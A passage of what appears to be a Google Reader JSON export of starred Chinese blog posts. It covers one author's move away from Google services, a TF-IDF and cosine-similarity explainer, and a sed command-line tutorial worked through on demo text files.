的这盆冷水。它让我们更加清醒地认识到，那些对你最为重要的基础服务，必须是有至少两家以上互相竞争，允许自由转入转出，并将其作为自己主营业务的公司提供的。比如，注册域名，你可以去任意一家注册机构，并随时迁入迁出；VPS，只要能够兼容同样的操作系统，至少迁移也不会是什么问题；SaaS，如报税服务通常都互相兼容其他服务保存的数据格式，等等。</p>\n\n<p>我为什么会允许出现这样一个对我来说很重要，但却只有一家公司提供的免费服务呢？诚然，RSS 阅读器并不是只有 Google Reader 一个，但是其他阅读器又好到哪里呢？你能从他们那里导出数据，并放到其竞争对手的服务上吗？</p>\n\n<p>这个教训不可谓不深刻，多年以来，我自己支付相当高的成本来维护自己的域名、邮件以及网站服务器以及建立异地备份系统，为的不就是防止吊死在一家服务提供商而出现问题吗？实际上，过去十年确实遇到过几次机房倒闭、域名转出被设置障碍等等奇葩事件，可是依靠异地冗余和备份，这些全都安然度过了。</p>\n\n<p>这几天我做了几件事情。</p>\n\n<p>首先是大家已经看到的，我导出了所有数据并关闭了我的 Google+ 帐户，并为此把绑定 Google 帐户登录的全部第三方网站改成了使用其它方式登录（关闭 Google+ 帐户会导致某些验证服务同时失效） 和重新设立 Youtube 帐户。</p>\n\n<p>这事并不完全由 Reader 而发，关闭 Reader 其实最多只是压死骆驼的最后一根稻草，我之前在 Picasa 相册一夜之间变成默认转到 Google+ 的时候就已经非常不爽了，但是由于这只是改了个默认选项，以及 Google Reader 依赖 Google+ 来完成分享，我还没有彻底下定决心关闭帐户，关闭 Google Reader 的消息一出，我发现几个月之后 Google+ 对于我来说将不会再产生任何价值，那还是索性关掉算了吧。</p>\n\n<p>然后是我开始迁移我的邮件服务：有非垃圾邮件发到我的 gmail 信箱？通知发件人，您该改下地址了...... Google 的邮件服务的反垃圾效果和用户体验仍然是目前我知道的邮件服务里最好的，但是未来 Google 邮件是否也会被融入 Google+ 里，并且强制收件人必须也得注册 Google+，甚至会不会关闭？也许我过虑了，但是反正我自己也有邮件服务，与其等将来有一天让 Google 做个决定把我轰走，不如自己先用脚投票。未来，我也会逐步减少对 Google 邮件服务的依赖：这个域名不是我的，所以我也没办法把它迁到其他地方。</p>\n\n<p>最后是，最近几天看到 FSF 的一则消息，说未来 Google Talk 可能会不再与第三方 XMPP 服务互联（理由是垃圾消息太多，这个理由在技术上可以说是说得过去的，但它影响还是很深远的：小朋友们，XMPP可以互联互通的时代结束了！）。我也正在架自己的 XMPP 服务，未来很可能 Google Talk 也会逐步停止使用。</p>\n\n<p>至于以后，我想我还是会用 Google 的搜索、翻译、地图、财经以及新闻服务----如果这些服务不突然终止或转入 Google+ 的话，至少还有别的公司提供搜索引擎、翻译服务、地图、财经以及新闻服务。至于 Google Drive、 Calendar、邮件以及 Picasa 服务，我已经自己架设或正在寻找替代方案，未来会逐渐过渡到优先使用自己可以完全控制，而不依赖特定厂商提供的服务。</p>\n\n<p>我觉得我要努力做到的状态是，以后无论任何一家公司，它愿意或不愿意做我需要的某项业务，都不至于对我的生活产生影响。主任说的好，冗余不做，日子甭过；我要说，冗余这事，从生活的一点一滴开始吧。</p>"
    },
    "author" : "Xin LI",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/https://blog.delphij.net/atom.xml",
      "title" : "delphij&#39;s Chaos",
      "htmlUrl" : "https://blog.delphij.net/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1363839436678",
    "timestampUsec" : "1363839436678348",
    "id" : "tag:google.com,2005:reader/item/6d32a9df78bd1302",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Algorithm" ],
    "title" : "TF-IDF与余弦相似性的应用（二）：找出相似文章",
    "published" : 1363838151,
    "updated" : 1363838151,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2013/03/cosine_similarity.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>上一次，我用<a href=\"http://www.ruanyifeng.com/blog/2013/03/tf-idf.html\">TF-IDF算法</a>自动提取关键词。</p><p>今天，我们再来研究另一个相关的问题。有些时候，除了找到关键词，我们还希望找到与原文章相似的其他文章。比如，\"Google新闻\"在主新闻下方，还提供多条相似的新闻。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201303/bg2013032001.png\"></p>\n\n<p>为了找出相似的文章，需要用到<a href=\"http://en.wikipedia.org/wiki/Cosine_similarity\">\"余弦相似性\"</a>（cosine similiarity）。下面，我举一个例子来说明，什么是\"余弦相似性\"。</p>\n\n<p>为了简单起见，我们先从句子着手。</p>\n\n<blockquote>\n\n<p>　　句子A：我喜欢看电视，不喜欢看电影。</p>\n\n<p>　　句子B：我不喜欢看电视，也不喜欢看电影。</p>\n\n</blockquote>\n\n<p>请问怎样才能计算上面两句话的相似程度？</p>\n\n<p>基本思路是：如果这两句话的用词越相似，它们的内容就应该越相似。因此，可以从词频入手，计算它们的相似程度。</p>\n\n<p><strong>第一步，分词。</strong></p>\n\n<blockquote>\n\n<p>　　句子A：我/喜欢/看/电视，不/喜欢/看/电影。</p>\n\n<p>　　句子B：我/不/喜欢/看/电视，也/不/喜欢/看/电影。</p>\n\n</blockquote>\n\n<p><strong>第二步，列出所有的词。</strong></p>\n\n<blockquote>\n\n<p>　　我，喜欢，看，电视，电影，不，也。</p>\n\n</blockquote>\n\n<p><strong>第三步，计算词频。</strong></p>\n\n<blockquote>\n\n<p>　　句子A：我 1，喜欢 2，看 2，电视 1，电影 1，不 1，也 0。</p>\n\n<p>　　句子B：我 1，喜欢 2，看 2，电视 1，电影 1，不 2，也 1。</p>\n\n</blockquote>\n\n<p><strong>第四步，写出词频向量。</strong></p>\n\n<blockquote>\n\n<p>　　句子A：[1, 2, 2, 1, 1, 1, 0]</p>\n\n<p>　　句子B：[1, 2, 2, 1, 1, 2, 1]</p>\n\n</blockquote>\n\n<p>到这里，问题就变成了如何计算这两个向量的相似程度。</p>\n\n<p>我们可以把它们想象成空间中的两条线段，都是从原点（[0, 0, ...]）出发，指向不同的方向。两条线段之间形成一个夹角，如果夹角为0度，意味着方向相同、线段重合；如果夹角为90度，意味着形成直角，方向完全不相似；如果夹角为180度，意味着方向正好相反。<strong>因此，我们可以通过夹角的大小，来判断向量的相似程度。夹角越小，就代表越相似。</strong></p>\n\n<p><img src=\"http://image.beekka.com/blog/201303/bg2013032002.png\"></p>\n\n<p>以二维空间为例，上图的a和b是两个向量，我们要计算它们的夹角θ。<a href=\"http://zh.wikipedia.org/zh-cn/%E9%A4%98%E5%BC%A6%E5%AE%9A%E7%90%86\">余弦定理</a>告诉我们，可以用下面的公式求得：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201303/bg2013032004.png\"></p>\n\n<p><img src=\"http://image.beekka.com/blog/201303/bg2013032003.png\"></p>\n\n<p>假定a向量是[x1, y1]，b向量是[x2, y2]，那么可以将余弦定理改写成下面的形式：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201303/bg2013032006.png\"></p>\n\n<p><img src=\"http://image.beekka.com/blog/201303/bg2013032005.png\"></p>\n\n<p>数学家已经证明，余弦的这种计算方法对n维向量也成立。假定A和B是两个n维向量，A是 [A1, A2, ..., An] ，B是 [B1, B2, ..., Bn] ，则A与B的夹角θ的余弦等于：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201303/bg2013032007.png\"></p>\n\n<p>使用这个公式，我们就可以得到，句子A与句子B的夹角的余弦。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201303/bg2013032008.png\"></p>\n\n<p><strong>余弦值越接近1，就表明夹角越接近0度，也就是两个向量越相似，这就叫\"余弦相似性\"。</strong>所以，上面的句子A和句子B是很相似的，事实上它们的夹角大约为20.3度。</p>\n\n<p>由此，我们就得到了\"找出相似文章\"的一种算法：</p>\n\n<blockquote>\n\n<p>　　（1）使用TF-IDF算法，找出两篇文章的关键词；</p>\n\n<p>　　（2）每篇文章各取出若干个关键词（比如20个），合并成一个集合，计算每篇文章对于这个集合中的词的词频（为了避免文章长度的差异，可以使用相对词频）；</p>\n\n<p>　　（3）生成两篇文章各自的词频向量；</p>\n\n<p>　　（4）计算两个向量的余弦相似度，值越大就表示越相似。</p>\n\n</blockquote>\n\n<p>\"余弦相似度\"是一种非常有用的算法，只要是计算两个向量的相似程度，都可以采用它。</p>\n\n<p>下一次，我想谈谈如何在词频统计的基础上，自动生成一篇文章的摘要。</p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2013/03/cosine_similarity.html\">http://www.ruanyifeng.com/blog/2013/03/cosine_similarity.html</a></li>\n<li>最后修改时间：2013年4月 7日 15:39</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><strong>[广告]</strong>　<a href=\"http://www.hi-vps.com/?utm_source=ruanyifeng.com\" style=\"border:none\">www.hi-vps.com创建于2010年，致力于提供更适合国人使用，性价比更高的VPS。我们的支付方式为支付宝，并且提供7天无理由退款服务。各种其他使用指南，请参考我们的WIKI。</a>\n</p></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1361330769119",
    "timestampUsec" : "1361330769119536",
    "id" : "tag:google.com,2005:reader/item/9d2cf0a5a6f72620",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Unix/Linux", "编程工具", "Linux", "sed", "Unix" ],
    "title" : "sed 简明教程",
    "published" : 1361320608,
    "updated" : 1361320608,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/9104.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><img alt=\"\" src=\"http://coolshell.cn//wp-content/uploads/2013/02/sed-superman.png\" width=\"216\" height=\"216\">awk于1977年出生，今年36岁本命年，sed比awk大2-3岁，awk就像林妹妹，sed就是宝玉哥哥了。所以 <a title=\"AWK 简明教程\" href=\"http://coolshell.cn/articles/9070.html\">林妹妹跳了个Topless</a>，他的哥哥sed坐不住了，也一定要出来抖一抖。</p>\n<p>sed全名叫stream editor，流编辑器，用程序的方式来编辑文本，相当的hacker啊。sed基本上就是玩正则模式匹配，所以，玩sed的人，正则表达式一般都比较强。</p>\n<p>同样，本篇文章不会说sed的全部东西，你可以参看<a href=\"http://www.gnu.org/software/sed/manual/sed.html\">sed的手册</a>，我这里主要还是想和大家竞争一下那些从手机指缝间或马桶里流走的时间，用这些时间来学习一些东西。当然，接下来的还是要靠大家自己双手。</p>\n<h4>用s命令替换</h4>\n<p>我使用下面的这段文本做演示：</p>\n<pre>$ cat pets.txt\nThis is my cat\n  my cat's name is betty\nThis is my dog\n  my dog's name is frank\nThis is my fish\n  my fish's name is george\nThis is my goat\n  my goat's name is adam</pre>\n<p>把其中的my字符串替换成Hao Chen’s，下面的语句应该很好理解（s表示替换命令，/my/表示匹配my，/Hao Chen’s/表示把匹配替换成Hao Chen’s，/g 表示一行上的替换所有的匹配）：</p>\n<pre>$ sed &quot;s/my/Hao Chen&#39;s/g&quot; pets.txt\nThis is Hao Chen&#39;s cat\n  Hao Chen&#39;s cat&#39;s name is betty\nThis is Hao Chen&#39;s dog\n  Hao Chen&#39;s dog&#39;s name is frank\nThis is Hao Chen&#39;s fish\n  Hao Chen&#39;s fish&#39;s name is george\nThis is Hao Chen&#39;s goat\n  Hao Chen&#39;s goat&#39;s name is adam</pre>\n<p>注意：如果你要使用单引号，那么你没办法通过\\’这样来转义，就有双引号就可以了，在双引号内可以用\\”来转义。</p>\n<p><span></span></p>\n<p>再注意：上面的sed并没有对文件的内容改变，只是把处理过后的内容输出，如果你要写回文件，你可以使用重定向，如：</p>\n<pre>$ sed &quot;s/my/Hao Chen&#39;s/g&quot; pets.txt &gt; hao_pets.txt</pre>\n<p>或使用 -i 参数直接修改文件内容：</p>\n<pre>$ sed -i &quot;s/my/Hao Chen&#39;s/g&quot; pets.txt</pre>\n<p>在每一行最前面加点东西：</p>\n<pre>$ sed 's/^/#/g' pets.txt\n#This is my cat\n#  my cat's name is betty\n#This is my dog\n#  my dog's name is frank\n#This is my fish\n#  my fish's name is george\n#This is my goat\n#  my goat's name is adam</pre>\n<p>在每一行最后面加点东西：</p>\n<pre>$ sed 's/$/ --- /g' pets.txt\nThis is my cat ---\n  my cat's name is betty ---\nThis is my dog ---\n  my dog's name is frank ---\nThis is my fish ---\n  my fish's name is george ---\nThis is my goat ---\n  my goat's name is adam ---</pre>\n<p>顺手介绍一下正则表达式的一些最基本的东西：</p>\n<ul>\n<li>^ 表示一行的开头。如：/^#/ 以#开头的匹配。</li>\n<li>$ 表示一行的结尾。如：/}$/ 以}结尾的匹配。</li>\n<li>\\&lt; 表示词首。 如 \\&lt;abc 表示以 abc 为首的詞。</li>\n<li>\\&gt; 表示词尾。 如 abc\\&gt; 表示以 abc 結尾的詞。</li>\n<li>. 表示任何单个字符。</li>\n<li>* 表示某个字符出现了0次或多次。</li>\n<li>[ ] 字符集合。 如：[abc]表示匹配a或b或c，还有[a-zA-Z]表示匹配所有的26个字符。如果其中有^表示反，如[^a]表示非a的字符</li>\n</ul>\n<p>正规则表达式是一些很牛的事，比如我们要去掉某html中的tags：</p>\n<pre>\n\n&lt;b&gt;This&lt;/b&gt; is what &lt;span style=&quot;text-decoration: underline;&quot;&gt;I&lt;/span&gt; meant. Understand?\n\n</pre>\n<p>看看我们的sed命令</p>\n<pre>\n# 如果你这样搞的话，就会有问题\n$ sed &#39;s/&lt;.*&gt;//g&#39; html.txt\n Understand?\n\n# 要解决上面的那个问题，就得像下面这样。\n# 其中的&#39;[^&gt;]&#39; 指定了除了&gt;的字符重复0次或多次。\n$ sed &#39;s/&lt;[^&gt;]*&gt;//g&#39; html.txt\nThis is what I meant. Understand?</pre>\n<p>我们再来看看指定需要替换的内容：</p>\n<pre>$ sed &quot;3s/my/your/g&quot; pets.txt\nThis is my cat\n  my cat&#39;s name is betty\nThis is your dog\n  my dog&#39;s name is frank\nThis is my fish\n  my fish&#39;s name is george\nThis is my goat\n  my goat&#39;s name is adam</pre>\n<p>下面的命令只替换第3到第6行的文本。</p>\n<pre>$ sed &quot;3,6s/my/your/g&quot; pets.txt\nThis is my cat\n  my cat&#39;s name is betty\nThis is your dog\n  your dog&#39;s name is frank\nThis is your fish\n  your fish&#39;s name is george\nThis is my goat\n  my goat&#39;s name is adam</pre>\n<p> </p>\n<pre>$ cat my.txt\nThis is my cat, my cat's name is betty\nThis is my dog, my dog's name is frank\nThis is my fish, my fish's name is george\nThis is my goat, my goat's name is adam</pre>\n<p>只替换每一行的第一个s：</p>\n<pre>$ sed 's/s/S/1' my.txt\nThiS is my cat, my cat's name is betty\nThiS is my dog, my dog's name is frank\nThiS is my fish, my fish's name is george\nThiS is my goat, my goat's name is adam</pre>\n<p>只替换每一行的第二个s：</p>\n<pre>$ sed 's/s/S/2' my.txt\nThis iS my cat, my cat's name is betty\nThis iS my dog, my dog's name is frank\nThis iS my fish, my fish's name is george\nThis iS my goat, my goat's name is adam</pre>\n<p>只替换第一行的第3个以后的s：</p>\n<pre>$ sed 's/s/S/3g' my.txt\nThis is my cat, my cat'S name iS betty\nThis is my dog, my dog'S name iS frank\nThis is my fiSh, my fiSh'S name iS george\nThis is my goat, my goat'S name iS adam</pre>\n<h4>多个匹配</h4>\n<p>如果我们需要一次替换多个模式，可参看下面的示例：（第一个模式把第一行到第三行的my替换成your，第二个则把第3行以后的This替换成了That）</p>\n<pre>$ sed '1,3s/my/your/g; 3,$s/This/That/g' my.txt\nThis is your cat, your cat's name is betty\nThis is your dog, your dog's name is frank\nThat is your fish, your fish's name is george\nThat is my goat, my goat's name is adam</pre>\n<p>上面的命令等价于：（注：下面使用的是sed的-e命令行参数）</p>\n<pre>sed -e '1,3s/my/your/g' -e '3,$s/This/That/g' my.txt</pre>\n<p>我们可以使用&amp;来当做被匹配的变量，然后可以在基本左右加点东西。如下所示：</p>\n<pre>$ sed &#39;s/my/[&amp;]/g&#39; my.txt\nThis is [my] cat, [my] cat&#39;s name is betty\nThis is [my] dog, [my] dog&#39;s name is frank\nThis is [my] fish, [my] fish&#39;s name is george\nThis is [my] goat, [my] goat&#39;s name is adam</pre>\n<h4>圆括号匹配</h4>\n<p>使用圆括号匹配的示例：（圆括号括起来的正则表达式所匹配的字符串会可以当成变量来使用，sed中使用的是\\1,\\2…）</p>\n<pre>$ sed 's/This is my \\([^,]*\\),.*is \\(.*\\)/\\1:\\2/g' my.txt\ncat:betty\ndog:frank\nfish:george\ngoat:adam</pre>\n<p>上面这个例子中的正则表达式有点复杂，解开如下（去掉转义字符）：</p>\n<p>正则为：This is my ([^,]*),.*is (.*)<br>\n匹配为：This is my (cat),……….is (betty)</p>\n<p>然后：\\1就是cat，\\2就是betty</p>\n<h4>sed的命令</h4>\n<p>让我们回到最一开始的例子pets.txt，让我们来看几个命令：</p>\n<h5>N命令</h5>\n<p>先来看N命令 —— 把下一行的内容纳入当成缓冲区做匹配。</p>\n<p>下面的的示例会把原文本中的偶数行纳入奇数行匹配，而s只匹配并替换一次，所以，就成了下面的结果：</p>\n<pre>$ sed 'N;s/my/your/' pets.txt\nThis is your cat\n  my cat's name is betty\nThis is your dog\n  my dog's name is frank\nThis is your fish\n  my fish's name is george\nThis is your goat\n  my goat's name is adam</pre>\n<p>也就是说，原来的文件成了：</p>\n<pre>This is my cat\\n  my cat's name is betty\nThis is my dog\\n  my dog's name is frank\nThis is my fish\\n  my fish's name is george\nThis is my goat\\n  my goat's name is adam</pre>\n<p>这样一来，下面的例子你就明白了，</p>\n<pre>$ sed 'N;s/\\n/,/' pets.txt\nThis is my cat,  my cat's name is betty\nThis is my dog,  my dog's name is frank\nThis is my fish,  my fish's name is george\nThis is my goat,  my goat's name is adam</pre>\n<h5>a命令和i命令</h5>\n<p>a命令就是append， i命令就是insert，它们是用来添加行的。如：</p>\n<pre># 其中的1i表明，其要在第1行前插入一行（insert）\n$ sed &quot;1 i This is my monkey, my monkey&#39;s name is wukong&quot; my.txt\nThis is my monkey, my monkey&#39;s name is wukong\nThis is my cat, my cat&#39;s name is betty\nThis is my dog, my dog&#39;s name is frank\nThis is my fish, my fish&#39;s name is george\nThis is my goat, my goat&#39;s name is adam\n\n# 其中的1a表明，其要在最后一行后追加一行（append）\n$ sed &quot;$ a This is my monkey, my monkey&#39;s name is wukong&quot; my.txt\nThis is my cat, my cat&#39;s name is betty\nThis is my monkey, my monkey&#39;s name is wukong\nThis is my dog, my dog&#39;s name is frank\nThis is my fish, my fish&#39;s name is george\nThis is my goat, my goat&#39;s name is adam</pre>\n<p>我们可以运用匹配来添加文本：</p>\n<pre># 注意其中的/fish/a，这意思是匹配到/fish/后就追加一行\n$ sed &quot;/fish/a This is my monkey, my monkey&#39;s name is wukong&quot; my.txt\nThis is my cat, my cat&#39;s name is betty\nThis is my dog, my dog&#39;s name is frank\nThis is my fish, my fish&#39;s name is george\nThis is my monkey, my monkey&#39;s name is wukong\nThis is my goat, my goat&#39;s name is adam</pre>\n<p>下面这个例子是对每一行都挺插入：</p>\n<pre>$ sed &quot;/my/a ----&quot; my.txt\nThis is my cat, my cat&#39;s name is betty\n----\nThis is my dog, my dog&#39;s name is frank\n----\nThis is my fish, my fish&#39;s name is george\n----\nThis is my goat, my goat&#39;s name is adam\n----</pre>\n<h5>c命令</h5>\n<p>c 命令是替换匹配行</p>\n<pre>$ sed &quot;2 c This is my monkey, my monkey&#39;s name is wukong&quot; my.txt\nThis is my cat, my cat&#39;s name is betty\nThis is my monkey, my monkey&#39;s name is wukong\nThis is my fish, my fish&#39;s name is george\nThis is my goat, my goat&#39;s name is adam\n\n$ sed &quot;/fish/c This is my monkey, my monkey&#39;s name is wukong&quot; my.txt\nThis is my cat, my cat&#39;s name is betty\nThis is my dog, my dog&#39;s name is frank\nThis is my monkey, my monkey&#39;s name is wukong\nThis is my goat, my goat&#39;s name is adam</pre>\n<h5>d命令</h5>\n<p>删除匹配行</p>\n<pre>$ sed '/fish/d' my.txt\nThis is my cat, my cat's name is betty\nThis is my dog, my dog's name is frank\nThis is my goat, my goat's name is adam\n\n$ sed '2d' my.txt\nThis is my cat, my cat's name is betty\nThis is my fish, my fish's name is george\nThis is my goat, my goat's name is adam\n\n$ sed '2,$d' my.txt\nThis is my cat, my cat's name is betty</pre>\n<h5>p命令</h5>\n<p>打印命令</p>\n<p>你可以把这个命令当成grep式的命令</p>\n<pre># 匹配fish并输出，可以看到fish的那一行被打了两遍，\n# 这是因为sed处理时会把处理的信息输出\n$ sed '/fish/p' my.txt\nThis is my cat, my cat's name is betty\nThis is my dog, my dog's name is frank\nThis is my fish, my fish's name is george\nThis is my fish, my fish's name is george\nThis is my goat, my goat's name is adam\n\n# 使用n参数就好了\n$ sed -n '/fish/p' my.txt\nThis is my fish, my fish's name is george\n\n# 从一个模式到另一个模式\n$ sed -n '/dog/,/fish/p' my.txt\nThis is my dog, my dog's name is frank\nThis is my fish, my fish's name is george\n\n#从第一行打印到匹配fish成功的那一行\n$ sed -n '1,/fish/p' my.txt\nThis is my cat, my cat's name is betty\nThis is my dog, my dog's name is frank\nThis is my fish, my fish's name is george</pre>\n<h4>几个知识点</h4>\n<p>好了，下面我们要介绍四个sed的基本知识点：</p>\n<h5>Pattern Space</h5>\n<p>第零个是关于-n参数的，大家也许没看懂，没关系，我们来看一下sed处理文本的伪代码，并了解一下Pattern Space的概念：</p>\n<pre>foreach line in file {\n    //放入把行Pattern_Space\n    Pattern_Space &lt;= line;\n\n    // 对每个pattern space执行sed命令\n    Pattern_Space &lt;= EXEC(sed_cmd, Pattern_Space);\n\n    // 如果没有指定 -n 则输出处理后的Pattern_Space\n    if (sed option hasn&#39;t &quot;-n&quot;)  {\n       print Pattern_Space\n    }\n}</pre>\n<h5>Address</h5>\n<p>第一个是关于address，几乎上述所有的命令都是这样的（注：其中的!表示匹配成功后是否执行命令）</p>\n<p>[address[,address]][!]{cmd}</p>\n<p>address可以是一个数字，也可以是一个模式，你可以通过逗号要分隔两个address 表示两个address的区间，参执行命令cmd，伪代码如下：</p>\n<pre>\nbool bexec = false\nforeach line in file {\n    if ( match(address1) ){\n        bexec = true;\n    }\n\n    if ( bexec == true) {\n        EXEC(sed_cmd);\n    }\n\n    if ( match (address2) ) {\n        bexec = false;\n    }\n}</pre>\n<p>关于address可以使用相对位置，如：</p>\n<pre># 其中的+3表示后面连续3行\n$ sed '/dog/,+3s/^/# /g' pets.txt\nThis is my cat\n  my cat's name is betty\n# This is my dog\n#   my dog's name is frank\n# This is my fish\n#   my fish's name is george\nThis is my goat\n  my goat's name is adam</pre>\n<h5>命令打包</h5>\n<p>第二个是cmd可以是多个，它们可以用分号分开，可以用大括号括起来作为嵌套命令。下面是几个例子：</p>\n<pre>$ cat pets.txt\nThis is my cat\n  my cat's name is betty\nThis is my dog\n  my dog's name is frank\nThis is my fish\n  my fish's name is george\nThis is my goat\n  my goat's name is adam\n\n# 对3行到第6行，执行命令/This/d\n$ sed '3,6 {/This/d}' pets.txt\nThis is my cat\n  my cat's name is betty\n  my dog's name is frank\n  my fish's name is george\nThis is my goat\n  my goat's name is adam\n\n# 对3行到第6行，匹配/This/成功后，再匹配/fish/，成功后执行d命令\n$ sed '3,6 {/This/{/fish/d}}' pets.txt\nThis is my cat\n  my cat's name is betty\nThis is my dog\n  my dog's name is frank\n  my fish's name is george\nThis is my goat\n  my goat's name is adam\n\n# 从第一行到最后一行，如果匹配到This，则删除之；如果前面有空格，则去除空格\n$ sed '1,${/This/d;s/^ *//g}' pets.txt\nmy cat's name is betty\nmy dog's name is frank\nmy fish's name is george\nmy goat's name is adam </pre>\n<h5>Hold Space</h5>\n<p>第三个我们再来看一下 Hold Space</p>\n<p>接下来，我们需要了解一下Hold Space的概念，我们先来看四个命令：</p>\n<p>g： 将hold space中的内容拷贝到pattern space中，原来pattern space里的内容清除<br>\nG： 将hold space中的内容append到pattern space\\n后<br>\nh： 将pattern space中的内容拷贝到hold space中，原来的hold space里的内容被清除<br>\nH： 将pattern space中的内容append到hold space\\n后<br>\nx： 交换pattern space和hold space的内容</p>\n<p>这些命令有什么用？我们来看两个示例吧，用到的示例文件是：</p>\n<pre>$ cat t.txt\none\ntwo\nthree</pre>\n<p>第一个示例：</p>\n<pre>$ sed 'H;g' t.txt\none\n\none\ntwo\n\none\ntwo\nthree</pre>\n<p>是不是有点没看懂，我作个图你就看懂了。</p>\n<p><img alt=\"\" src=\"http://coolshell.cn//wp-content/uploads/2013/02/sed_demo_00.jpg\" width=\"592\" height=\"404\"></p>\n<p>第二个示例，反序了一个文件的行：</p>\n<pre>$ sed '1!G;h;$!d' t.txt\nthree\ntwo\none</pre>\n<p>其中的 ’1!G;h;$!d’ 可拆解为三个命令</p>\n<ul>\n<li>1!G —— 只有第一行不执行G命令，将hold space中的内容append回到pattern space</li>\n<li>h —— 第一行都执行h命令，将pattern space中的内容拷贝到hold space中</li>\n<li>$!d —— 除了最后一行不执行d命令，其它行都执行d命令，删除当前行</li>\n</ul>\n<p>这个执行序列很难理解，做个图如下大家就明白了：</p>\n<p><img alt=\"\" src=\"http://coolshell.cn//wp-content/uploads/2013/02/sed_demo.jpg\" width=\"623\" height=\"316\"></p>\n<p>就先说这么多吧，希望对大家有用。</p>\n<p>（全文完）\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2012年11月23日 -- <a href=\"http://coolshell.cn/articles/8619.html\">你可能不知道的Shell</a></li><li>2012年08月16日 -- <a href=\"http://coolshell.cn/articles/8088.html\">对技术的态度</a></li><li>2012年07月11日 -- <a href=\"http://coolshell.cn/articles/7829.html\">28个Unix/Linux的命令行神器</a></li><li>2012年08月01日 -- <a href=\"http://coolshell.cn/articles/7965.html\">一个fork的面试题</a></li><li>2012年05月03日 -- <a href=\"http://coolshell.cn/articles/7236.html\">用Unix的设计思想来应对多变的需求</a></li><li>2012年06月20日 -- <a href=\"http://coolshell.cn/articles/7490.html\">性能调优攻略</a></li><li>2013年02月17日 -- <a href=\"http://coolshell.cn/articles/9070.html\">AWK 简明教程</a></li><li>2010年08月24日 -- <a href=\"http://coolshell.cn/articles/2822.html\">使用grep恢复被删文件内容</a></li></ul><div><a href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1361330764220",
    "timestampUsec" : "1361330764220195",
    "id" : "tag:google.com,2005:reader/item/e10df742fd969771",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "启动效应：或将彻底改变人类行为的心理学发现，如果它是真的话",
    "published" : 1361290705,
    "updated" : 1361290705,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/436704/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
